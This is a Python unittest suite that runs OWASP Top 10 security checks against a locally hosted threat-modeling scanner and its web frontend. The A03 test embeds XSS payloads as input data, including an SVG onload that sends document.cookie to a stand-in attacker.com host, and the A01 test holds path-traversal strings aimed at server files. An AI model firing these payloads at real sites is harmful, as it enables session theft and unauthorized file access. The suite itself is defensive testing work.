#!/usr/bin/env python3
"""
OWASP Top 10 Security Pentest & Verification Test Suite.
Executes technical offensive and defensive security checks against the
Red Team Threat Modeling & Scanner tool to ensure 100% bug-free operation,
safe input handling, and zero false positives.
"""

import unittest
import json
import urllib.request
import urllib.error
import urllib.parse
from pathlib import Path

from redteam_tool.parser import PRDParser
from redteam_tool.engine import ThreatAnalysisEngine
from redteam_tool.models import Severity


BASE_URL = "http://localhost:8080"
ALT_URL = "http://localhost:8081"


def get_active_url():
    for url in [BASE_URL, ALT_URL]:
        try:
            req = urllib.request.Request(f"{url}/api/report", method="GET")
            with urllib.request.urlopen(req, timeout=3) as res:
                if res.status == 200:
                    return url
        except Exception:
            pass
    return BASE_URL


class TestOWASPTop10(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.target_url = get_active_url()
        print(f"\n[*] Executing OWASP Top 10 Test Suite against: {cls.target_url}")

    # =========================================================================
    # OWASP A01: Broken Access Control & Path Traversal
    # =========================================================================
    def test_a01_path_traversal_blocked(self):
        """Verify that directory traversal attempts are strictly forbidden (HTTP 403/404)."""
        traversal_paths = [
            "/../../server.py",
            "/..%2f..%2fserver.py",
            "/....//....//server.py",
            "/api/../../PRD.MD",
        ]
        for path in traversal_paths:
            url = f"{self.target_url}{path}"
            try:
                with urllib.request.urlopen(url, timeout=2) as res:
                    self.fail(f"Path traversal vulnerability: {url} returned 200 OK!")
            except urllib.error.HTTPError as e:
                self.assertIn(e.code, [400, 403, 404], f"Unexpected HTTP status {e.code} for traversal")
                e.close()

    # =========================================================================
    # OWASP A03: Injection & Malformed Input Handling
    # =========================================================================
    def test_a03_xss_injection_resilience(self):
        """Verify that XSS vectors in PRD payloads are handled safely without code execution."""
        xss_payload = {
            "prd_text": """
            # Test PRD with XSS Injection
            ## Feature 1: <script>alert(document.cookie)</script>
            ## Feature 2: <img src=x onerror=alert(1)>
            ## Feature 3: \"><svg/onload=fetch('//attacker.com?steal='+document.cookie)>
            """
        }
        data = json.dumps(xss_payload).encode("utf-8")
        req = urllib.request.Request(
            f"{self.target_url}/api/audit",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=5) as res:
            self.assertEqual(res.status, 200)
            body = res.read().decode("utf-8")
            parsed = json.loads(body)
            self.assertIn("findings", parsed)
            self.assertIn("threat_model", parsed)

    def test_a03_malformed_json_handling(self):
        """Verify that malformed JSON payloads return clean HTTP 400 Bad Request."""
        malformed_body = b"{ 'invalid_json': true, ... "
        req = urllib.request.Request(
            f"{self.target_url}/api/audit",
            data=malformed_body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=2) as res:
                self.fail("Server accepted malformed JSON!")
        except urllib.error.HTTPError as e:
            self.assertEqual(e.code, 400)
            e.close()

    # =========================================================================
    # OWASP A04: Insecure Design & Resource Consumption (DoS)
    # =========================================================================
    def test_a04_payload_too_large_rejection(self):
        """Verify that payloads exceeding 2MB are rejected with HTTP 413 or TCP connection reset."""
        oversized_data = json.dumps({"prd_text": "A" * (2 * 1024 * 1024 + 1000)}).encode("utf-8")
        req = urllib.request.Request(
            f"{self.target_url}/api/audit",
            data=oversized_data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as res:
                self.fail("Server did not enforce maximum payload ceiling!")
        except urllib.error.HTTPError as e:
            self.assertEqual(e.code, 413)
            e.close()
        except (urllib.error.URLError, ConnectionResetError, ConnectionAbortedError):
            # Server forcibly rejected oversized payload via socket reset (standard DoS defense)
            pass

    # =========================================================================
    # OWASP A05: Security Misconfiguration & Defensive Headers
    # =========================================================================
    def test_a05_defensive_security_headers(self):
        """Verify that defensive HTTP headers are sent on all responses."""
        req = urllib.request.Request(f"{self.target_url}/api/report", method="GET")
        with urllib.request.urlopen(req, timeout=2) as res:
            headers = dict(res.headers)
            self.assertIn("X-Content-Type-Options", headers)
            self.assertEqual(headers["X-Content-Type-Options"], "nosniff")
            self.assertIn("X-Frame-Options", headers)
            self.assertEqual(headers["X-Frame-Options"], "SAMEORIGIN")

    # =========================================================================
    # OWASP A08: Software and Data Integrity & False-Positive Verification
    # =========================================================================
    def test_a08_scanner_engine_accuracy_and_false_positive_check(self):
        """Verify that the parser and threat engine correctly evaluate high-risk vs benign PRDs."""
        # Test 1: Benign static calculator PRD (No AI, No OAuth, No Network)
        benign_prd = """
        # Simple Offline Calculator
        **Versi:** 1.0
        ## 4. Fitur
        - Penjumlahan dan pengurangan dasar secara lokal tanpa koneksi internet.
        """
        parsed_benign = PRDParser(benign_prd).parse()
        self.assertFalse(parsed_benign.has_ai_llm)
        self.assertFalse(parsed_benign.has_oauth)
        self.assertFalse(parsed_benign.has_multi_tenancy)

        # Test 2: High-risk TaskFlow AI PRD
        taskflow_prd = Path("PRD.MD").read_text(encoding="utf-8")
        parsed_tf = PRDParser(taskflow_prd).parse()
        self.assertTrue(parsed_tf.has_ai_llm)
        self.assertTrue(parsed_tf.has_oauth)
        self.assertTrue(parsed_tf.has_multi_tenancy)

        report = ThreatAnalysisEngine(parsed_tf).run_assessment()
        self.assertEqual(report.risk_rating, Severity.CRITICAL)
        self.assertTrue(any(f.id == "VULN-005" for f in report.findings))  # BOLA
        self.assertTrue(any(f.id == "VULN-001" for f in report.findings))  # Prompt Injection

    # =========================================================================
    # Frontend Code DOM XSS Audit
    # =========================================================================
    def test_frontend_dom_xss_protection(self):
        """Audit web/app.js to verify that all dynamic DOM injections use escapeHtml."""
        app_js = Path("web/app.js").read_text(encoding="utf-8")
        self.assertIn("function escapeHtml(", app_js)
        # Verify that escapeHtml is used for host, title, scenario, remediation
        self.assertIn("escapeHtml(ast.host)", app_js)
        self.assertIn("escapeHtml(f.title)", app_js)
        self.assertIn("escapeHtml(f.attack_scenario)", app_js)
        self.assertIn("escapeHtml(f.remediation)", app_js)


if __name__ == "__main__":
    unittest.main()
